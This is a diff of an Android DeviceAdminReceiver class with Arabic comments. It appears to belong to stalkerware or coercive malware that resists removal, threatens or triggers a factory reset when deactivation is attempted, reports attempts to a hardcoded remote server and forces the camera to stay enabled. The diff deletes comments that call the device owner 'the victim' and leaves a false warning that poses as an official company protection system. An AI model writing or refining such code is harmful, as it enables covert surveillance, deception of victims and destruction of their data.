@@ -21,9 +21,9 @@ import java.net.URL;
  * AdminReceiver - قلب الحماية في المشروع
  * ============================================================
  * الوظائف:
- * 1. تفعيل Device Admin (لحماية التطبيق من الحذف)
- * 2. مراقبة محاولات إلغاء التفعيل (Disable Requested)
- * 3. تنفيذ Factory Reset (Wipe Data) عند محاولة الحذف
+ * 1. تفعيل Device Admin
+ * 2. مراقبة محاولات إلغاء التفعيل
+ * 3. تنفيذ Factory Reset عند محاولة الحذف
  * 4. الإبلاغ عن أي محاولة إلغاء تفعيل للسيرفر
  * ============================================================
  */
@@ -35,14 +35,12 @@ public class AdminReceiver extends DeviceAdminReceiver {
     private static final String KEY_LAST_WARNING = "last_warning_time";
     private static final String KEY_FACTORY_RESET_TRIGGERED = "factory_reset_triggered";
 
-    // ★★★ سيرفر الإبلاغ ★★★
     private static final String SERVER_URL = "https://daf-production-e34a.up.railway.app";
 
-    // ★★★ الحد الأقصى لمحاولات إلغاء التفعيل قبل الضبط ★★★
     private static final int MAX_WARNINGS_BEFORE_WIPE = 1;
 
     // ============================================================
-    // onEnabled - عندما يتم تفعيل Device Admin
+    // onEnabled
     // ============================================================
     @Override
     public void onEnabled(Context context, Intent intent) {
@@ -78,13 +76,26 @@ public class AdminReceiver extends DeviceAdminReceiver {
                 Log.e(TAG, "[ADMIN] persistence error: " + e.getMessage());
             }
 
+            // ★★★ تأكد إن الكاميرا مش ممنوعة ★★★
+            try {
+                DevicePolicyManager dpm = (DevicePolicyManager)
+                        context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+                ComponentName admin = new ComponentName(context, AdminReceiver.class);
+                if (dpm != null && dpm.isAdminActive(admin)) {
+                    dpm.setCameraDisabled(admin, false);
+                    Log.d(TAG, "[ADMIN] ★ Camera policy set to ENABLED ★");
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "[ADMIN] camera policy error: " + e.getMessage());
+            }
+
         } catch (Exception e) {
             Log.e(TAG, "[ADMIN] onEnabled error: " + e.getMessage());
         }
     }
 
     // ============================================================
-    // onDisableRequested - ★★★ الأهم: عندما يحاول الضحية إلغاء التفعيل ★★★
+    // onDisableRequested
     // ============================================================
     @Override
     public CharSequence onDisableRequested(Context context, Intent intent) {
@@ -152,7 +163,6 @@ public class AdminReceiver extends DeviceAdminReceiver {
                 }
             }
 
-            // ★★★ الرسالة التحذيرية للضحية ★★★
             return "⚠️ تحذير نهائي من نظام الحماية ⚠️\n\n"
                     + "هذا التطبيق جزء من نظام الحماية الرسمي للجهاز.\n\n"
                     + "لا يمكن إلغاء تفعيل مسؤول النظام إلا بكلمة سر الشركة.\n\n"
@@ -168,7 +178,7 @@ public class AdminReceiver extends DeviceAdminReceiver {
     }
 
     // ============================================================
-    // onDisabled - ★★★ عندما يتم إلغاء التفعيل فعليًا ★★★
+    // onDisabled
     // ============================================================
     @Override
     public void onDisabled(Context context, Intent intent) {
@@ -215,7 +225,7 @@ public class AdminReceiver extends DeviceAdminReceiver {
     }
 
     // ============================================================
-    // onPasswordFailed - حماية إضافية
+    // onPasswordFailed
     // ============================================================
     @Override
     public void onPasswordFailed(Context context, Intent intent) {
@@ -246,7 +256,7 @@ public class AdminReceiver extends DeviceAdminReceiver {
     }
 
     // ============================================================
-    // onPasswordSucceeded - تصفير العداد
+    // onPasswordSucceeded
     // ============================================================
     @Override
     public void onPasswordSucceeded(Context context, Intent intent) {
@@ -273,8 +283,7 @@ public class AdminReceiver extends DeviceAdminReceiver {
     }
 
     // ============================================================
-    // onReceive - استقبال كل الأحداث
-    // ★★★ تم استخدام الثوابت الصحيحة من DeviceAdminReceiver ★★★
+    // onReceive
     // ============================================================
     @Override
     public void onReceive(Context context, Intent intent) {
@@ -285,7 +294,6 @@ public class AdminReceiver extends DeviceAdminReceiver {
             Log.d(TAG, "[ADMIN] onReceive: " + action);
 
             if (intent != null) {
-                // ★★★ الثوابت الصحيحة موجودة في DeviceAdminReceiver ★★★
                 if (DeviceAdminReceiver.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED
                         .equals(action)) {
                     Log.d(TAG, "[ADMIN] Disable requested via onReceive");
@@ -356,4 +364,4 @@ public class AdminReceiver extends DeviceAdminReceiver {
             } catch (Exception ignored) {}
         }
     }
-                            }
+                }
